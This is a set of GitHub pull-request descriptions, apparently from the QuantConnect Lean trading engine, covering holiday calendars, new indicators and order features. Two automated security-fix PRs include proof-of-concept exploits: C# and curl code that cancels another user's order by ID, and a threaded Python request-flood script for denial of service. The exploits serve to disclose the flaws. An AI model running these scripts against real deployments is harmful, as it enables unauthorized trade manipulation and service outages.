The first agent was expected to scrap the holiday calendar directly from the website while the second had already the official files with the schedule for each holiday (available in their official site after signing up). Each agent used gpt-5.2, the model with outputs closer to the expected. \r\n\r\nThe first agent (scrapper.py) produces better outputs when given an structured output, web search parameter and reasoning in level `low`. However, although it learned to distinguish between full holidays and holidays, it doesn't recognize late opens and is\r\ninaccurate with the early closes and bank holidays. I believe this is because it doesn't have access to the official holiday schedule table, posted in CME website, as that table doesn't seem to be present in the HTML structure of the official source.\r\n\r\nThe second agent (transformer.py), produces an output way more accurate than the first one, using an structured output and reasoning in level `high`. It perfectly distinguishes between holidays and bank holidays and is accurate in the early close and late open times. However, it still doesn't handle correctly bank holiday dates with both early closes and late opens (Like independence day schedule for equity based futures). \r\n#### Related Issue\r\n<!--- This project only accepts pull requests related to open issues -->\r\n<!--- If suggesting a new feature or change, please discuss it in an issue first -->\r\n<!--- If fixing a bug, there should be an issue describing it with steps to reproduce -->\r\n<!--- Please link to the issue here: -->\r\nn/a\r\n#### Motivation and Context\r\n<!--- Why is this change required?

published a complete 2026 Holiday schedule, just for New Year (https://www.sgx.com/trading , https://www.oanda.com/bvi-en/cfds/holiday-trading-hours/). Still, there was some wrong holidays in `Forex-oanda-[*]`. On the other hand, each IB CFD is part of the exchange SMART, which seems to be an special 'exchange' from IBKR, that searches the best prices for your orders on real exchanges such as Nasdaq, Nyse, etc. For that reason, I added the 2026 USA national holidays to `Cfd-interactivebrokers-[*]`, following the pattern already present.\r\n<img width=\"600\" height=\"525\" alt=\"image\" src=\"https://github.com/user-attachments/assets/db96d8fb-5975-469b-82fb-f9e8f114e9a4\" />\r\n\r\n#### Related Issue\r\n<!--- This project only accepts pull requests related to open issues -->\r\n<!--- If suggesting a new feature or change, please discuss it in an issue first -->\r\n<!--- If fixing a bug, there should be an issue describing it with steps to reproduce -->\r\n<!--- Please link to the issue here: -->\r\nn/a\r\n#### Motivation and Context\r\n<!--- Why is this change required?

requested in issue #6982.\r\nThis indicator computes the covariance between two data series (target and reference) over a specified period using `MathNet.Numerics.Statistics.Covariance`.\r\n\r\n#### Related Issue\r\nCloses #6982\r\n\r\n#### Motivation and Context\r\nCovariance is a fundamental statistical measure used in finance, particularly for portfolio optimization and risk management. Adding this indicator allows users to easily calculate the joint variability of two assets within the Lean engine.\r\n\r\n#### Requires Documentation Change\r\nNo. (Standard indicator addition)\r\n\r\n#### How Has This Been Tested?\r\n- Created a new test class `CovarianceTests.cs`.\r\n- Verified mathematical accuracy by comparing the indicator output against manual calculation.\r\n- Verified standard indicator behaviors: `IsReady`, `Reset`, and `WarmUp`.\r\n- Ran unit tests locally using `dotnet test`.\r\n\r\n#### Types of changes\r\n- [ ] Bug fix (non-breaking change which fixes an issue)\r\n- [ ] Refactor (non-breaking change which improves implementation)\r\n- [ ] Performance (non-breaking change which improves performance. Please add associated performance test and results)\r\n- [x] New feature (non-breaking change which adds functionality)\r\n- [ ] Breaking change (fix or feature that would cause existing functionality to change)\r\n- [ ] Non-functional change (xml comments/documentation/etc)\r\n\r\n#### Checklist:\r\n- [x] My code follows the code style of this project.\r\n- [x] I have read the **CONTRIBUTING** [document](https://github.com/QuantConnect/Lean/blob/master/CONTRIBUTING.md).\r\n- [x] I have added tests to cover my changes. <!-- If not applicable, please explain why -->\r\n- [x] All new and existing tests passed.\r\n- [x] My branch follows the naming convention `bug-<issue#>-<description>` or `feature-<issue#>-<description>`", "created_at": "2025-12-19T10:34:31Z", "updated_at":

HKFE Holidays, early closes, late opens and bank holidays\r\n- The information was extracted from https://www.cmegroup.com/trading-hours.html and https://www.hkex.com.hk/Services/Trading/Derivatives/Overview/Trading-Calendar-and-Holiday-Schedule?sc_lang=en\r\n- The unit test `EnergyExpiryDateFunction_WithDifferentDates_ShouldFollowContract(\"HH\",\"00:00:00\")` was failing since the expiry date function wasn't taking into account the 2026 thanksgiving bank holiday <img width=\"1216\" height=\"137\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5eabe46a-60c8-4b2b-b94a-768e94721df7\" />\r\n- The holiday schedule for the futures AW and GD were added manually as they don't follow the holiday schedule of the CME Future class \"Grains\" (Even though they are commodity indices)\r\n- Columbus and Veterans day of 2026 and 2027 was added as a bank holiday in the generic entries `Future-cme-[*]`, `Future-cbot-[*]`, `Future-nymex-[*]` and `Future-comex-[*]` \r\n\r\n#### Related Issue\r\n<!--- This project only accepts pull requests related to open issues -->\r\n<!--- If suggesting a new feature or change, please discuss it in an issue first -->\r\n<!--- If fixing a bug, there should be an issue describing it with steps to reproduce -->\r\n<!--- Please link to the issue here: -->\r\nn/a\r\n#### Motivation and Context\r\n<!--- Why is this change required?

The python module reads a [changes.json](https://github.com/user-attachments/files/24388078/changes.json) file with the changes, adds them to the MHDB (taking into account the exchange time zone) and finally checks for duplicated entries. It knows the class of each future in the MHDB thanks to this file: https://www.dropbox.com/scl/fi/09j95smm8ko09aupx66gl/cme-group-futures-info.json?rlkey=43ne4e093vtsqo6o2vnbrvtfh&st=tadv9em1&dl=0\r\n\r\n#### Types of changes\r\n<!--- What types of changes does your code introduce?

The refactor allows developers to leverage generic test cases from Lean for their brokerage consumers, enabling independent testing of order logic.\r\n\r\n#### Related Issue\r\nN/A\r\n\r\n#### Related PRs\r\n- https://github.com/QuantConnect/Lean.Brokerages.Tastytrade/pull/13\r\n\r\n#### Motivation and Context\r\nPreviously, `BrokerageTests` had limited support for testing different order types, making it cumbersome for developers to validate combo orders in their custom brokerage implementations. This refactor streamlines the process, improving test coverage and reducing boilerplate code.\r\n\r\n#### Requires Documentation Change\r\nN/A\r\n\r\n#### How Has This Been Tested?\r\n- Verified that existing single order type tests continue to pass. (I have test in [InteractiveBrokers](https://github.com/QuantConnect/Lean.brokerages.InteractiveBrokers))\r\n\r\n<img width=\"367\" height=\"409\" alt=\"image\" src=\"https://github.com/user-attachments/assets/9955c80b-67ae-44a4-bac3-ca2aa780770d\" />\r\n\r\n- Added and executed new tests for combo order scenarios.

Instead, the trade direction should be indicated using a negative **group quantity** in `ComboLimit` and quantity in `ComboLegLimit`.\r\n\r\nFor instance (`ComboLimit`):\r\n```\r\nvar groupQuantiity = -1;\r\n\r\nvar legs = new List<Leg>(2)\r\n{ \r\n  Leg.Create(callContracts[0], -1),\r\n  Leg.Create(callContracts[1], 1)\r\n};\r\n\r\nComboLimitOrder(legs, groupQuantiity , temporaryLimitPrice);\r\n\r\n```\r\n\r\nThe Lean now returns a specific error message if a negative limit price is used.\r\n\r\n#### Related Issue\r\nN/A\r\n\r\n#### Motivation and Context\r\nPrevent users from accidentally submitting orders with negative limit prices, which are not supported by the API and could result in incorrect order interpretation. Ensures trade direction is explicitly communicated via group quantity, improving correctness and user experience.\r\n\r\n#### Requires Documentation Change\r\nN/a\r\n\r\n#### How Has This Been Tested?\r\n- Verified that using a negative limit price for ComboLimit or ComboLegLimit returns the correct warning message.\r\n- Unit tests added for both ComboLimit and ComboLegLimit scenarios.\r\n\r\n#### Types of changes\r\n<!--- What types of changes does your code introduce?

vulnerability detected by our security scanner.\n\n### Security Impact Assessment\n\n| Aspect | Rating | Rationale |\n|--------|--------|-----------|\n| Impact | High | In the QuantConnect Lean trading platform, exploitation could allow an authenticated user to modify any order in the system, potentially leading to unauthorized trade executions, portfolio manipulations, or financial losses for other users. This bypasses user isolation in a multi-tenant environment where users deploy and manage their own algorithms and orders. While not enabling full system compromise, it poses significant risks to data integrity and financial security within the platform. |\n| Likelihood | Medium | The repository is used in a cloud-deployed trading platform with authenticated users, increasing the attack surface for those with valid accounts. However, exploitation requires knowing specific OrderIds, which may not be easily enumerable, and assumes the attacker is already authenticated, reducing it from a high-likelihood scenario. Insider knowledge or targeted attacks could make it feasible, but it's not trivially exploitable without additional reconnaissance. |\n| Ease of Fix | Medium | Remediation involves adding user ownership verification in the Process method, likely requiring modifications to order retrieval logic to include user ID checks and possibly updating related database queries or API endpoints. This could necessitate changes across multiple files in the transaction handling layer, moderate testing to ensure no regressions in order processing, and potential impacts on performance or dependencies in the brokerage integration. |\n\n### Evidence: Proof-of-Concept Exploitation Demo\n\n**\u26a0\ufe0f For Educational/Security Awareness Only**\n\nThis demonstration shows how the vulnerability could be exploited to help you understand its severity and prioritize remediation.\n\n#### How This Vulnerability Can Be Exploited\n\nThe vulnerability in `BrokerageTransactionHandler.cs` allows an authenticated user to modify any order in the system by simply knowing its `OrderId`, as the `Process` method lacks user ownership verification. This enables unauthorized order manipulation, such as canceling or altering trades belonging to other users, potentially leading to financial losses or market manipulation. In the context of QuantConnect Lean, which handles algorithmic trading and live brokerage integrations, this could be exploited via API endpoints that process order requests without proper authorization checks.\n\nThe vulnerability in `BrokerageTransactionHandler.cs` allows an authenticated user to modify any order in the system by simply knowing its `OrderId`, as the `Process` method lacks user ownership verification. This enables unauthorized order manipulation, such as canceling or altering trades belonging to other users, potentially leading to financial losses or market manipulation. In the context of QuantConnect Lean, which handles algorithmic trading and live brokerage integrations, this could be exploited via API endpoints that process order requests without proper authorization checks.\n\n```csharp\n// Proof-of-Concept Exploit Code (C# Console Application)\n// This demonstrates exploiting the vulnerability by simulating API calls to modify an arbitrary order.\n// Assumes the Lean API is exposed (e.g., via a REST endpoint like /api/orders/process) and the attacker is authenticated.\n// In a real scenario, this would be run against a deployed Lean instance with valid auth tokens.\n\nusing System;\nusing System.Net.Http;\nusing System.Net.Http.Headers;\nusing System.Text;\nusing System.Threading.Tasks;\n\nclass ExploitPoC\n{\n    private static readonly HttpClient client = new HttpClient();\n\n    static async Task Main(string[] args)\n    {\n        // Attacker's authentication token (obtained via legitimate login or session hijacking)\n        string authToken = \"Bearer YOUR_VALID_JWT_OR_API_TOKEN_HERE\";  // Replace with real token\n        \n        // Target order ID belonging to another user (discovered via enumeration or leaked data)\n        string targetOrderId = \"12345\";  // Example: Known order ID from public logs or brute-force\n        \n        // Payload to modify the order (e.g., cancel it or change quantity)\n        var payload = new\n        {\n            OrderId = targetOrderId,\n            Action = \"Cancel\",  // Or \"Update\" with new parameters like Quantity = 1000\n            // Other fields as per Lean's OrderRequest model in QuantConnect.Orders\n        };\n        \n        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(\"Bearer\", authToken.Split(' ')[1]);\n        \n        // Send POST request to the vulnerable Process method endpoint (assuming REST API exposure)\n        var content = new StringContent(System.Text.Json.JsonSerializer.Serialize(payload), Encoding.UTF8, \"application/json\");\n        var response = await client.PostAsync(\"https://your-lean-instance.com/api/orders/process\", content);  // Replace with actual endpoint\n        \n        if (response.IsSuccessStatusCode)\n        {\n            Console.WriteLine(\"Exploit successful: Order modified without ownership check.\");\n            var responseBody = await response.Content.ReadAsStringAsync();\n            Console.WriteLine(\"Response: \" + responseBody);\n        }\n        else\n        {\n            Console.WriteLine(\"Exploit failed or blocked: \" + response.StatusCode);\n        }\n    }\n}\n```\n```bash\n# Alternative Exploitation Steps (Using curl for manual testing)\n# Prerequisites: Attacker has a valid authentication token and knows a target OrderId (e.g., from API enumeration or logs).\n\n# Step 1: Obtain auth token (simulate login or use stolen session)\n# (In real attack, use tools like Burp Suite to capture tokens)\n\n# Step 2: Craft and send malicious request to modify another user's order\ncurl -X POST \"https://your-lean-instance.com/api/orders/process\" \\\n  -H \"Authorization: Bearer YOUR_VALID_JWT_OR_API_TOKEN_HERE\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"OrderId\": \"12345\",  // Target order ID (not owned by attacker)\n    \"Action\": \"Cancel\"   // Or other modifications like updating quantity/symbol\n  }'\n\n# Expected result: Order is processed successfully, bypassing ownership verification.\n# If the API returns success, the exploit works. Test in a safe environment.\n```\n\n#### Exploitation Impact Assessment\n\n| Impact Category | Severity | Description |\n|-----------------|----------|-------------|\n| Data Exposure | Medium | Unauthorized access to order details (e.g., quantities, symbols, timestamps) could leak sensitive trading strategies or financial positions of other users, potentially revealing proprietary algorithms or market insights. However, direct credential theft is unlikely unless orders contain embedded tokens. |\n| System Compromise | Low | No direct system access is gained; the vulnerability is limited to order manipulation within the trading engine. An attacker cannot execute arbitrary code, escalate to root, or access underlying infrastructure like databases or servers. |\n| Operational Impact | High | Successful exploitation could cancel or alter legitimate trades, causing financial losses for affected users (e.g., missed opportunities or unintended positions). In live trading scenarios, this might disrupt market operations, trigger margin calls, or lead to cascading failures in dependent algorithms, with potential downtime during incident response. |\n| Compliance Risk | High | Violates financial regulations such as SEC Rule 606 (best execution) and FINRA rules on fair trading practices. It could breach data protection standards like GDPR if user financial data is involved, and fails OWASP API security guidelines (e.g., Broken Object Level Authorization). Audits for trading platforms may flag this as a critical failure. |\n\n### Vulnerability Details\n- **Rule ID**: `V-001`\n- **File**: `Engine/TransactionHandlers/BrokerageTransactionHandler.cs`\n- **Description**: The `Process` method in `BrokerageTransactionHandler` retrieves an order using the `OrderId` from the request but fails to verify that the order belongs to the user making the request. This allows any authenticated user to modify any order in the system if they know its ID.\n\n### Changes Made\nThis automated fix addresses the vulnerability by applying security best practices.\n\n### Files Modified\n- `Engine/TransactionHandlers/BrokerageTransactionHandler.cs`\n\n### Verification\nThis fix has been automatically verified through:\n- \u2705 Build verification\n- \u2705 Scanner re-scan\n- \u2705 LLM code review\n\n\ud83e\udd16 This PR was automatically generated.\n", "created_at": "2025-12-30T08:23:18Z", "updated_at": "2025-12-30T13:15:27Z", "closed_at":

vulnerability detected by our security scanner.\n\n### Security Impact Assessment\n\n| Aspect | Rating | Rationale |\n|--------|--------|-----------|\n| Impact | Medium | In the QuantConnect Lean repository, this demo algorithm's unprotected API endpoint could allow DoS attacks that overwhelm the local or cloud-hosted execution environment, disrupting trading simulations or live strategies for the affected user, but it wouldn't compromise the broader platform or lead to data breaches since it's isolated to the algorithm's runtime. |\n| Likelihood | Low | Exploitation is unlikely given QuantConnect's controlled cloud deployment where algorithms aren't typically exposed as public APIs, requiring insider knowledge or misconfiguration to access the endpoint, and attackers have little motivation to target individual demo algorithms in this trading-focused repository. |\n| Ease of Fix | Easy | Remediation involves adding a rate-limiting library like Flask-Limiter or FastAPI's built-in middleware with minimal code changes to the Python file, no dependencies on other parts of the repository, and straightforward testing to ensure the endpoint remains functional. |\n\n### Evidence: Proof-of-Concept Exploitation Demo\n\n**\u26a0\ufe0f For Educational/Security Awareness Only**\n\nThis demonstration shows how the vulnerability could be exploited to help you understand its severity and prioritize remediation.\n\n#### How This Vulnerability Can Be Exploited\n\nThe vulnerability in `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py` involves a Flask-based API endpoint (`@app.post('/')`) that lacks rate-limiting, allowing an attacker to flood it with requests. In the context of the QuantConnect Lean repository, this file appears to be a demonstration algorithm for exporting trading signals, potentially running a local or exposed web server to receive POST data (e.g., signal updates). An attacker could exploit this by deploying the vulnerable code in a test environment and using automated scripts to send excessive requests, overwhelming server resources and causing a denial of service (DoS).\n\nThe vulnerability in `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py` involves a Flask-based API endpoint (`@app.post('/')`) that lacks rate-limiting, allowing an attacker to flood it with requests. In the context of the QuantConnect Lean repository, this file appears to be a demonstration algorithm for exporting trading signals, potentially running a local or exposed web server to receive POST data (e.g., signal updates). An attacker could exploit this by deploying the vulnerable code in a test environment and using automated scripts to send excessive requests, overwhelming server resources and causing a denial of service (DoS).\n\nTo demonstrate exploitation, first clone and set up the repository in a controlled environment (e.g., a local VM or container). The vulnerable file contains a Flask app that listens on a port (likely 5000 by default) and processes POST requests without any throttling.\n\n```bash\n# Step 1: Clone the repository and navigate to the vulnerable file\ngit clone https://github.com/QuantConnect/Lean.git\ncd Lean/Algorithm.Python\n\n# Step 2: Install dependencies (assuming Python 3.8+ and Flask are available; install if needed)\npip install flask\n\n# Step 3: Run the vulnerable algorithm (this starts the Flask app; in a real deployment, it might be exposed via Lean\u2019s execution engine or a custom setup)\npython CustomSignalExportDemonstrationAlgorithm.py\n# The app will start listening on http://localhost:5000 (or similar, based on code inspection)\n```\n\nOnce the app is running, an attacker can exploit the lack of rate-limiting by flooding the endpoint with POST requests using a simple script. This simulates a DoS attack by consuming CPU/memory resources, as the endpoint processes each request without limits.\n\n```python\n# exploit_flood.py - Python script to flood the endpoint with POST requests\nimport requests\nimport threading\nimport time\n\nTARGET_URL = \"http://localhost:5000/\"  # Adjust if the app runs on a different host/port\nNUM_THREADS = 50  # Number of concurrent threads for flooding\nREQUESTS_PER_THREAD = 1000  # Requests per thread\n\ndef flood_endpoint():\n    for _ in range(REQUESTS_PER_THREAD):\n        try:\n            # Send a sample POST request (mimicking signal export data from the algorithm)\n            response = requests.post(TARGET_URL, json={\"signal\": \"buy\", \"timestamp\": time.time()})\n            print(f\"Request sent: {response.status_code}\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n# Launch multiple threads to simulate high-volume attack\nthreads = []\nfor i in range(NUM_THREADS):\n    t = threading.Thread(target=flood_endpoint)\n    threads.append(t)\n    t.start()\n\nfor t in threads:\n    t.join()\n\nprint(\"Flood attack completed.\")\n```\n\n#### Exploitation Impact Assessment\n\n| Impact Category | Severity | Description |\n|-----------------|----------|-------------|\n| Data Exposure | None | The endpoint in this demonstration algorithm handles trading signal data (e.g., buy/sell signals), which is not inherently sensitive or personally identifiable. No user credentials, financial accounts, or proprietary trading strategies are exposed; it's primarily demo data without access to Lean's core user databases or API keys. |\n| System Compromise | Low | Exploitation leads to resource exhaustion but no code execution or privilege escalation. An attacker gains no system access beyond overwhelming the process; the Flask app remains isolated, and Lean's sandboxed execution model prevents broader compromise unless combined with other vulnerabilities. |\n| Operational Impact | High | Successful flooding causes immediate DoS, halting the signal export functionality and potentially disrupting trading algorithm execution if integrated with Lean's runtime. Resources (CPU/memory) are exhausted, leading to service unavailability for legitimate users, with recovery requiring app restart or scaling; in a cloud deployment, this could affect multiple trading sessions or backtesting jobs. |\n| Compliance Risk | Medium | Violates OWASP Top 10 A6:2021 (Vulnerable and Outdated Components) by lacking rate-limiting in a web-facing component. For a financial trading platform like Lean, this could indirectly impact compliance with standards like SOC 2 (availability controls) or industry regulations (e.g., SEC oversight on trading systems), especially if the demo is misdeployed in production, risking audit failures or fines for service disruptions. |\n\n### Vulnerability Details\n- **Rule ID**: `V-004`\n- **File**: `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py`\n- **Description**: The API endpoint `@app.post('/')` lacks any rate-limiting mechanism. This allows an attacker to send a high volume of requests, potentially overwhelming the server's resources (CPU, memory) and causing a denial of service for legitimate users.\n\n### Changes Made\nThis automated fix addresses the vulnerability by applying security best practices.\n\n### Files Modified\n- `Algorithm.Python/CustomSignalExportDemonstrationAlgorithm.py`\n\n### Verification\nThis fix has been automatically verified through:\n- \u2705 Build verification\n- \u2705 Scanner re-scan\n- \u2705 LLM code review\n\n\ud83e\udd16 This PR was automatically generated.\n", "created_at":

false}, "body": "#### Description\n\nThis PR implements order book depth data support in LEAN by introducing a new `TickType.Orderbook` and associated `Orderbook` class. The implementation provides a complete solution for accessing multi-level bid/ask order book data in algorithms.\n\n**Core Changes:**\n- Add `TickType.Orderbook` enum value (value 3) to `Global.cs`\n- Add `Orderbook` class inheriting from `Tick` with multi-level bid/ask support\n- Add `Orderbooks` collection class (`DataDictionary<Symbol, Orderbook>`)\n- Add `Orderbooks` property to `Slice` class for algorithm access\n- Add order book caching in `SecurityCache`\n- Add order book handling in `TimeSliceFactory`\n- Add `LeanData` support for Orderbook type mapping\n- Add `[ProtoInclude]` for Protocol Buffers serialization in `Tick.cs`\n\n**Orderbook Class Features:**\n- Supports configurable price levels (default 10 levels)\n- `Bids` and `Asks` lists with `OrderbookLevel` (Price, Size) entries\n- CSV Reader for historical data: `timestamp,bid1_price,bid1_size,...,ask1_price,ask1_size,...`\n- Validation: crossed spread detection, proper bid/ask ordering\n- Helper methods: `GetMidPrice()`, `GetSpread()`, `GetBestBid()`, `GetBestAsk()`, `GetBid(level)`, `GetAsk(level)`\n- Execution estimation: `CalculateSlippage(side, quantity)`, `CalculateFillableQuantity(side, notional)`\n\n#### Related Issue\n\nRelated to: #997 ([Crypto] Add Orderbook Support to LEAN)\n\nThis PR provides the data infrastructure for order book support. While issue #997 was closed, the order book functionality was not implemented. This PR addresses that need.\n\n#### Motivation and Context\n\nOrder book depth data is essential for:\n- **Slippage analysis**: Estimate execution costs before placing orders\n- **Market making strategies**: Access to full depth for spread calculation\n- **Arbitrage strategies**: Compare order books across venues\n- **Liquidity analysis**: Assess market depth at various price levels\n\nCurrently LEAN only supports `Trade`, `Quote`, and `OpenInterest` tick types. Adding `Orderbook` extends LEAN's capability to handle full order book depth data, which is particularly important for cryptocurrency markets where order book data is widely available.\n\n#### Requires Documentation Change\n\nYes, documentation updates required:\n- Add `TickType.Orderbook` to TickType enum documentation\n- Add `Orderbook` class reference documentation\n- Add `Slice.Orderbooks` property documentation\n- Add example usage for accessing order book data in algorithms\n\n#### How Has This Been Tested?\n\n- **47 comprehensive unit tests** covering:\n  - Constructor and initialization tests\n  - CSV Reader tests (valid data, edge cases, error handling)\n  - GetSource path generation tests\n  - Helper method tests (spread, mid price, best bid/ask)\n  - Calculation tests (slippage, fillable quantity)\n  - Clone and ToString tests\n  - Orderbooks collection tests\n- All existing LEAN tests pass\n- Build succeeds with no errors or warnings\n\n#### Types of changes\n\n- [ ] Bug fix (non-breaking change which fixes an issue)\n- [ ] Refactor (non-breaking change which improves implementation)\n- [ ] Performance (non-breaking change which improves performance)\n- [x] New feature (non-breaking change which adds functionality)\n- [ ] Breaking change (fix or feature that would cause existing functionality to change)\n- [ ] Non-functional change (xml comments/documentation/etc)\n\n#### Checklist:\n\n- [x] My code follows the code style of this project.\n- [x] I have read the **CONTRIBUTING** [document](https://github.com/QuantConnect/Lean/blob/master/CONTRIBUTING.md).\n- [x] I have added tests to cover my changes.\n- [x] All new and existing tests passed.\n- [x] My branch follows the

addition and removal notifications in order to avoid sending duplicate notifications and make sure both the addition and later removal are communicated.\r\n\r\nFor instance, two universes can select a single security, like a continuous future universe and a future chain universe, with internal and non-internal subscriptions. In some cases, the removal notification was not communicated to the algorithm (OnSecuritiesChanged).\r\n\r\n#### Related Issue\r\n<!--- This project only accepts pull requests related to open issues -->\r\n<!--- If suggesting a new feature or change, please discuss it in an issue first -->\r\n<!--- If fixing a bug, there should be an issue describing it with steps to reproduce -->\r\n<!--- Please link to the issue here: -->\r\n\r\nCloses #9009\r\n\r\n#### Motivation and Context\r\n<!--- Why is this change required?
